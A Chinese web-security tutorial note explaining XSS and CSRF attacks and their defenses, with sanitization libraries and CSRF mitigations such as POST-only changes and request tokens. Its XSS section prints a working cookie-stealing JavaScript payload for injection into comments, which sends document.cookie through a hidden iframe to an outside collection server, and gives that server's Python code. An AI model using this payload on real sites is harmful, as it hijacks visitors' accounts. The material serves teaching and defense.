#  XSS 与 CSRF 两种跨站攻击

- XSS：跨站脚本（Cross-site scripting）

- CSRF：跨站请求伪造（Cross-site request forgery）

## XSS

>XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，  
例如发布评论，提交含有 JavaScript 的内容文本。  
这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。 

- 也可以是盗号或者其他未授权的操作——我们来模拟一下这个过程，先建立一个用来收集信息的服务器：
```
#!/usr/bin/env python
#-*- coding:utf-8 -*-

"""
跨站脚本注入的信息收集服务器
"""

import bottle

app = bottle.Bottle()
plugin = bottle.ext.sqlite.Plugin(dbfile='/var/db/myxss.sqlite')
app.install(plugin)

@app.route('/myxss/')
def show(cookies, db):
    SQL = 'INSERT INTO "myxss" ("cookies") VALUES (?)'
    try:
        db.execute(SQL, cookies)
    except:
        pass
    return ""

if __name__ == "__main__":
    app.run()
```
- 在某一个页面的评论中注入这段代码：

// 用 <script type="text/javascript"></script> 包起来放在评论中
```
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
```
于是每个访问到含有该评论的页面的用户都会遇到麻烦——他们不知道背后正悄悄的发起了一个请求，是他们所看不到的。

而这个请求，会把包含了他们的帐号和其他隐私的信息发送到收集服务器上。

- 这里附上一些“白名单”消毒 HTML 标签和属性（Sanitize HTML）的开源解决方案
- Python: [lxml.html.clean](http://lxml.de/lxmlhtml.html#cleaning-up-html) / [bleach](https://github.com/jsocol/bleach)
- Ruby: [Sanitize](https://github.com/rgrove/sanitize/)
- JavaScript: [sanitize-html](https://github.com/punkave/sanitize-html)
- PHP: [htmlpurifier](http://htmlpurifier.org/)

## CSRF 冒充用户之手: CSRF 顾名思义，是伪造请求，冒充用户在站内的正常操作

>起初一直弄不清楚 CSRF 究竟和 XSS 有什么区别，后来才明白 CSRF 和 XSS 根本是两个不同维度上的分类。
XSS 是实现 CSRF 的诸多途径中的一条，但绝对不是唯一的一条。一般习惯上把通过 XSS 来实现的 CSRF 称为 XSRF。

CSRF 的全称是“跨站请求伪造”，而 XSS 的全称是“跨站脚本”

- 提高的一个门槛，就是改良站内 API 的设计。对于发布帖子这一类创建资源的操作，应该只接受 POST 请求，而 GET 请求应该只浏览而不改变服务器端资源。  
当然，最理想的做法是使用REST 风格 [2] 的 API 设计，GET、POST、PUT、DELETE 四种请求方法对应资源的读取、创建、修改、删除。  
现在的浏览器基本不支持在表单中使用 PUT 和 DELETE 请求方法，我们可以使用 ajax 提交请求（例如通过 jquery-form 插件，我最喜欢的做法），  
也可以使用隐藏域指定请求方法，然后用 POST 模拟 PUT 和 DELETE （Ruby on Rails 的做法）。  
这么一来，不同的资源操作区分的非常清楚，我们把问题域缩小到了非 GET 类型的请求上——攻击者已经不可能通过发布链接来伪造请求了，  
但他们仍可以发布表单，或者在其他站点上使用我们肉眼不可见的表单，在后台用 js 操作，伪造请求。  

- 方法就是“请求令牌”

## 参考资料
- https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/
- https://juejin.im/post/5bc009996fb9a05d0a055192
- https://juejin.im/post/5bad9140e51d450e935c6d64
